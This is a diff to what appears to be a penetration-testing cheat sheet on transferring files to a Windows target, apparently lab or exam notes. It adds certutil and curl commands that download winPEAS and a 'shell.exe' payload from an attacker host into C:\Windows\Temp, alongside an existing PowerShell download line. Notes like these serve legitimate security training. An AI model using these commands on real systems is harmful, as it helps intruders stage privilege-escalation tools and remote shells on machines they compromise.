@@ -2,6 +2,22 @@
 
 ---
 
+## CMD / Windows
+
+```
+certutil -urlcache -split -f http://192.168.45.163/winpeas.bat C:/Windows/Temp/winpeas.bat
+```
+
+##### 32 Bit
+
+Navigate into C:\Windows\System32 in order to execute certutil or other commands. Since if the CPU Architecture is 32-bit and the system is poorly configured, we can only execute certutil, curl etc. there.
+
+```
+curl http://192.168.45.163/shell.exe -o C:\Windows\Temp\shell.exe
+```
+
+## PowerShell
+
 ```
 Invoke-WebRequest -Uri "http://<local_ip>/winPEAS.bat" -OutFile "C:\Users\Jareth\Documents\winPEAS.bat"
 ```
